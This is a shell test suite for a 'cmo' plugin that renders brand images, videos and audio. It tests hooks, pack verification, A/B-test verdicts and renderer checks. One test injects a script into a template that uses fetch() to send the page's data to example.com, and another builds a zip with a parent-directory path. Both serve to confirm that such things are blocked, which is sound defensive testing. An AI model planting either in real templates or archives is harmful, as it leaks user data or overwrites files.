#!/bin/sh
# Deterministic tests for the cmo plugin: no model calls. Run from anywhere:
#   sh plugins/cmo/tests/run.sh
# Render tests run when Playwright is found (CMO_PLAYWRIGHT, the project, or ~/.cmo/render);
# audio and video tests need ffmpeg. Missing tools skip those tests and say so.
set -u
here=$(cd "$(dirname "$0")" && pwd)
plugin=$(cd "$here/.." && pwd)
fx="$here/fixtures/brand-pack"
tmp=$(mktemp -d "${TMPDIR:-/tmp}/cmo-tests.XXXXXX")
trap 'rm -rf "$tmp"' EXIT
pass=0; fail=0; skip=0
ok()   { pass=$((pass+1)); echo "ok    $1"; }
bad()  { fail=$((fail+1)); echo "FAIL  $1"; [ -n "${2:-}" ] && echo "      $2"; }
skp()  { skip=$((skip+1)); echo "skip  $1 ($2)"; }
expect_exit() { # name expected-code command...
  name=$1; want=$2; shift 2
  out=$("$@" 2>&1); got=$?
  if [ "$got" -eq "$want" ]; then ok "$name"; else bad "$name" "exit $got, wanted $want: $(echo "$out" | tail -2 | tr '\n' ' ')"; fi
}

echo "== static checks"
expect_exit "frontmatter, references, bundled files, JSON, starters" 0 node "$plugin/tests/check-plugin.mjs"
if command -v claude >/dev/null; then
  expect_exit "claude plugin validate --strict" 0 claude plugin validate --strict "$plugin"
else skp "claude plugin validate" "claude not on PATH"; fi

echo "== hooks"
out=$(CLAUDE_PROJECT_DIR="$fx" sh "$plugin/scripts/session-start.sh")
echo "$out" | grep -q "Brand: Lumen Books, version 1.0.0" && ok "session-start summarizes the brand" || bad "session-start summarizes the brand" "$out"
echo "$out" | grep -q "autumn-club" && ok "session-start lists open campaigns" || bad "session-start lists open campaigns" "$out"
out=$(CLAUDE_PROJECT_DIR="$tmp" sh "$plugin/scripts/session-start.sh"); [ -z "$out" ] && ok "session-start is silent without .cmo" || bad "session-start is silent without .cmo"
mkdir -p "$tmp/ws/.cmo"
echo '{"agent_type":"cmo:copywriter","session_id":"s1"}' | CLAUDE_PROJECT_DIR="$tmp/ws" sh "$plugin/scripts/log-agent-run.sh"
grep -q '"event":"agent_finished"' "$tmp/ws/.cmo/agent-runs.jsonl" 2>/dev/null && ok "log-agent-run appends a record" || bad "log-agent-run appends a record"
node -e 'require("fs").readFileSync(process.argv[1],"utf8").trim().split("\n").forEach(l=>JSON.parse(l))' "$tmp/ws/.cmo/agent-runs.jsonl" 2>/dev/null && ok "agent-runs.jsonl lines are valid JSON" || bad "agent-runs.jsonl lines are valid JSON"

echo "== export and import"
if command -v zip >/dev/null && command -v unzip >/dev/null; then
  cp -R "$fx" "$tmp/proj"
  (cd "$tmp/proj" && sh "$plugin/skills/export/pack.sh" "$tmp/pack.zip" >/dev/null 2>&1)
  [ -f "$tmp/pack.zip" ] && ok "pack.sh writes a pack" || bad "pack.sh writes a pack"
  expect_exit "verify-pack accepts an untouched pack" 0 sh "$plugin/skills/import/verify-pack.sh" "$tmp/pack.zip" "$tmp/v1"
  mkdir -p "$tmp/t" && (cd "$tmp/t" && unzip -q "$tmp/pack.zip" && f=$(find . -name claims.json | head -1) && echo ' ' >> "$f" && zip -qr "$tmp/tampered.zip" .)
  expect_exit "verify-pack refuses a changed file" 1 sh "$plugin/skills/import/verify-pack.sh" "$tmp/tampered.zip" "$tmp/v2"
  (cd "$tmp" && mkdir -p evil && echo x > evil/x && zip -q unsafe.zip ../"$(basename "$tmp")"/evil/x 2>/dev/null; true)
  if unzip -Z1 "$tmp/unsafe.zip" 2>/dev/null | grep -q '\.\.'; then
    expect_exit "verify-pack refuses unsafe paths" 1 sh "$plugin/skills/import/verify-pack.sh" "$tmp/unsafe.zip" "$tmp/v3"
  else skp "verify-pack refuses unsafe paths" "this zip can't store parent paths"; fi
else skp "export and import" "zip or unzip missing"; fi

echo "== measurement"
out=$(node "$plugin/skills/measurement/abtest.mjs" --a 310/18400 --b 580/18400)
echo "$out" | grep -q '"verdict": "B is better at 95% confidence"' && ok "abtest calls a clear winner" || bad "abtest calls a clear winner" "$out"
out=$(node "$plugin/skills/measurement/abtest.mjs" --a 31/18400 --b 58/18400)
echo "$out" | grep -q 'hint only: B leads' && ok "abtest calls 30 to 99 conversions a hint" || bad "abtest calls 30 to 99 conversions a hint" "$out"
out=$(node "$plugin/skills/measurement/abtest.mjs" --a 337/2325 --b 2056/12770)
node -e 'const r=JSON.parse(process.argv[1]);const clear=r.confidence_interval[0]>0||r.confidence_interval[1]<0;process.exit(clear===/better/.test(r.verdict)?0:1)' "$out" && ok "abtest verdict agrees with its interval" || bad "abtest verdict agrees with its interval" "$out"
out=$(node "$plugin/skills/measurement/abtest.mjs" --a 5/300 --b 12/300)
echo "$out" | grep -q 'too small to compare' && ok "abtest refuses small samples" || bad "abtest refuses small samples"
expect_exit "abtest rejects bad input" 2 node "$plugin/skills/measurement/abtest.mjs" --a 10 --b 5/100

echo "== renderer: input checks (no browser needed)"
R="$plugin/skills/templates/render.mjs"
S="$plugin/skills/templates/starters"
echo '{"headline":"x","ground":"purple"}' > "$tmp/bad.json"
expect_exit "refuses a fill that breaks the slots" 2 node "$R" --brand "$fx/.cmo/brand" --template "$S/headline-card" --data "$tmp/bad.json" --out "$tmp/r/bad"
expect_exit "refuses a format the brand doesn't define" 2 node "$R" --brand "$fx/.cmo/brand" --template "$S/headline-card" --data "$S/headline-card/example.json" --out "$tmp/r/x" --formats 2x1
mkdir -p "$tmp/b2" && sed 's/"surface": "#F2EEE3"/"surface": null/' "$fx/.cmo/brand/brand.json" > "$tmp/b2/brand.json"
echo '{"headline":"A card on the surface ground.","ground":"surface"}' > "$tmp/surface.json"
expect_exit "refuses a ground whose tokens the brand lacks" 2 node "$R" --brand "$tmp/b2" --template "$S/headline-card" --data "$tmp/surface.json" --out "$tmp/r/y"
expect_exit "rejects a bad --fps" 2 node "$R" --brand "$fx/.cmo/brand" --template "$S/headline-card" --data "$S/headline-card/example.json" --out "$tmp/r/z" --fps abc
expect_exit "rejects an empty --formats" 2 node "$R" --brand "$fx/.cmo/brand" --template "$S/headline-card" --data "$S/headline-card/example.json" --out "$tmp/r/z" --formats ""
expect_exit "rejects unknown arguments" 2 node "$R" --nope

echo "== renderer: images and video"
if node "$R" --check >/dev/null 2>&1; then
  cd "$fx"
  expect_exit "renders a carousel in two formats" 0 node "$R" --brand .cmo/brand --template "$S/headline-card" --data "$S/headline-card/example.json" --out "$tmp/r/card" --formats 1x1,9x16
  n=$(ls "$tmp/r"/card-*-p0*.png 2>/dev/null | wc -l | tr -d ' ')
  [ "$n" = "6" ] && ok "one PNG per slide per format (6)" || bad "one PNG per slide per format" "found $n"
  node -e 'const m=JSON.parse(require("fs").readFileSync(process.argv[1]));if(m.failed||m.warnings.length)throw new Error(JSON.stringify(m.warnings))' "$tmp/r/card.render.json" 2>/dev/null && ok "carousel manifest has no warnings" || bad "carousel manifest has no warnings" "$(cat "$tmp/r/card.render.json" 2>/dev/null | head -c 400)"
  printf '{"language":"ar","direction":"rtl","ground":"dark","headline":"\\u0643\\u062a\\u0627\\u0628 \\u062c\\u064a\\u062f \\u0645\\u0639 \\u0623\\u0635\\u062f\\u0642\\u0627\\u0621.","highlight":"\\u0645\\u0639 \\u0623\\u0635\\u062f\\u0642\\u0627\\u0621"}' > "$tmp/ar.json"
  expect_exit "renders Arabic right to left" 0 node "$R" --brand .cmo/brand --template "$S/headline-card" --data "$tmp/ar.json" --out "$tmp/r/ar" --formats 1x1
  expect_exit "refuses to overwrite an existing render" 2 node "$R" --brand .cmo/brand --template "$S/headline-card" --data "$tmp/ar.json" --out "$tmp/r/ar" --formats 1x1
  expect_exit "overwrites with --force" 0 node "$R" --brand .cmo/brand --template "$S/headline-card" --data "$tmp/ar.json" --out "$tmp/r/ar" --formats 1x1 --force
  # A brand that defines only some formats: the default renders those and warns about the rest.
  mkdir -p "$tmp/b3" && cp -R .cmo/brand/assets "$tmp/b3/" && node -e 'const fs=require("fs");const b=JSON.parse(fs.readFileSync(process.argv[1]));b.formats={"1x1":b.formats["1x1"]};fs.writeFileSync(process.argv[2],JSON.stringify(b))' .cmo/brand/brand.json "$tmp/b3/brand.json"
  out=$(node "$R" --brand "$tmp/b3" --template "$S/headline-card" --data "$S/headline-card/example.json" --out "$tmp/r/partial" 2>&1)
  [ $? -eq 0 ] && grep -q "skipped 4x5, 9x16, 16x9" "$tmp/r/partial.render.json" && ok "defaults to the formats the brand defines" || bad "defaults to the formats the brand defines" "$out"
  # Approval binds to content, and templates can't reach the network.
  cp -R "$S/headline-card" "$tmp/tpl" && h=$(node "$R" --hash --template "$tmp/tpl")
  node -e 'const fs=require("fs");const p=process.argv[1];const t=JSON.parse(fs.readFileSync(p));t.approved={by:"test",at:"2026-11-07T00:00:00Z",sha256:process.argv[2]};fs.writeFileSync(p,JSON.stringify(t,null,2))' "$tmp/tpl/template.json" "$h"
  node "$R" --brand .cmo/brand --template "$tmp/tpl" --data "$S/headline-card/example.json" --out "$tmp/r/appr" --formats 1x1 >/dev/null 2>&1
  grep -q '"approved": true' "$tmp/r/appr.render.json" && ok "an approved template renders as approved" || bad "an approved template renders as approved"
  sed 's#</body>#<script>fetch("https://example.com/collect?d=" + encodeURIComponent(JSON.stringify(window.CMO.data))).catch(()=>{});</script></body>#' "$tmp/tpl/index.html" > "$tmp/tpl/i2" && mv "$tmp/tpl/i2" "$tmp/tpl/index.html"
  node "$R" --brand .cmo/brand --template "$tmp/tpl" --data "$S/headline-card/example.json" --out "$tmp/r/edit" --formats 1x1 >/dev/null 2>&1
  grep -q '"approved": false' "$tmp/r/edit.render.json" && grep -q "changed since it was approved" "$tmp/r/edit.render.json" && ok "an edited template loses its approval" || bad "an edited template loses its approval"
  grep -q "blocked a request to example.com" "$tmp/r/edit.render.json" && ok "templates can't send data to the network" || bad "templates can't send data to the network" "$(head -c 600 "$tmp/r/edit.render.json")"
  # Text that can't fit fails the render.
  cp -R "$S/headline-card" "$tmp/tpl2" && sed 's/"max_chars": 70/"max_chars": 2000/' "$S/headline-card/template.json" > "$tmp/tpl2/template.json"
  node -e 'console.log(JSON.stringify({headline:"Words ".repeat(150).trim()}))' > "$tmp/long.json"
  expect_exit "fails a render whose text doesn't fit" 1 node "$R" --brand .cmo/brand --template "$tmp/tpl2" --data "$tmp/long.json" --out "$tmp/r/long" --formats 1x1
  if command -v ffmpeg >/dev/null; then
    expect_exit "reports video timing with --info" 0 node "$R" --brand .cmo/brand --template "$S/announce-video" --data "$S/announce-video/example.json" --out "$tmp/r/v" --formats 1x1 --info
    expect_exit "mixes a soundtrack to an exact length" 0 node "$plugin/skills/audio/mix.mjs" --duration 14.9 --bed "$here/fixtures/tone.wav" --out "$tmp/r/st.wav"
    d=$(ffprobe -v error -show_entries format=duration -of csv=p=0 "$tmp/r/st.wav" 2>/dev/null)
    node -e 'process.exit(Math.abs(Number(process.argv[1])-14.9)<0.05?0:1)' "$d" && ok "soundtrack is 14.9 s (got $d)" || bad "soundtrack length" "got $d"
    expect_exit "mixer refuses a sound logo past the end" 2 node "$plugin/skills/audio/mix.mjs" --duration 1 --logo "$here/fixtures/tone.wav" --out "$tmp/r/x.wav"
    out=$(node "$plugin/skills/audio/mix.mjs" --duration 10 --bed "$here/fixtures/tone.wav" --vo "$here/fixtures/tone.wav" --vo-at 0.5 --duck --logo "$here/fixtures/tone.wav" --out "$tmp/r/full.wav" 2>&1)
    echo "$out" | grep -q '"integrated_lufs": -1[3-5]' && ok "mixes bed, ducked voice-over and sound logo, and measures loudness" || bad "mixes bed, ducked voice-over and sound logo" "$out"
    expect_exit "mixer refuses a voice-over over the sound logo" 2 node "$plugin/skills/audio/mix.mjs" --duration 10 --vo "$here/fixtures/tone.wav" --vo-at 5 --logo "$here/fixtures/tone.wav" --logo-at 6 --out "$tmp/r/o.wav"
    expect_exit "mixer rejects a bad number" 2 node "$plugin/skills/audio/mix.mjs" --duration 10 --logo "$here/fixtures/tone.wav" --logo-at abc --out "$tmp/r/n.wav"
    expect_exit "mixer refuses to overwrite" 2 node "$plugin/skills/audio/mix.mjs" --duration 10 --bed "$here/fixtures/tone.wav" --out "$tmp/r/full.wav"
    expect_exit "renders the video with sound at 10 fps" 0 node "$R" --brand .cmo/brand --template "$S/announce-video" --data "$S/announce-video/example.json" --out "$tmp/r/v" --formats 1x1 --fps 10 --audio "$tmp/r/st.wav" --loudness off
    grep -q '"scenes"' "$tmp/r/v.render.json" && grep -q '"integrated_lufs"' "$tmp/r/v.render.json" && ok "manifest has scene times and measured loudness" || bad "manifest has scene times and measured loudness"
    d=$(ffprobe -v error -show_entries format=duration -of csv=p=0 "$tmp/r/v-1x1.mp4" 2>/dev/null)
    node -e 'process.exit(Math.abs(Number(process.argv[1])-14.9)<0.15?0:1)' "$d" && ok "video length matches the template (got $d)" || bad "video length" "got $d"
    [ -s "$tmp/r/v-1x1.srt" ] && grep -q -- '-->' "$tmp/r/v-1x1.srt" && ok "subtitles written" || bad "subtitles written"
    grep -q "^How it works$" "$tmp/r/v-1x1.srt" && ! grep -q "How it works\." "$tmp/r/v-1x1.srt" && ok "subtitles keep the copy exactly as written" || bad "subtitles keep the copy exactly as written" "$(head -12 "$tmp/r/v-1x1.srt")"
    node -e 'const t=require("fs").readFileSync(process.argv[1],"utf8");const bad=t.split("\n").filter(l=>l.length>42&&!l.includes("-->"));process.exit(bad.length?1:0)' "$tmp/r/v-1x1.srt" && ok "no subtitle line over 42 characters" || bad "no subtitle line over 42 characters"
    [ -s "$tmp/r/v-1x1-poster.png" ] && ok "poster frame written" || bad "poster frame written"
  else skp "video and audio" "ffmpeg missing"; fi
  cd - >/dev/null
else skp "rendering" "Playwright not found: npm install --prefix ~/.cmo/render playwright-core"; fi

echo
echo "passed $pass, failed $fail, skipped $skip"
[ "$fail" -eq 0 ]
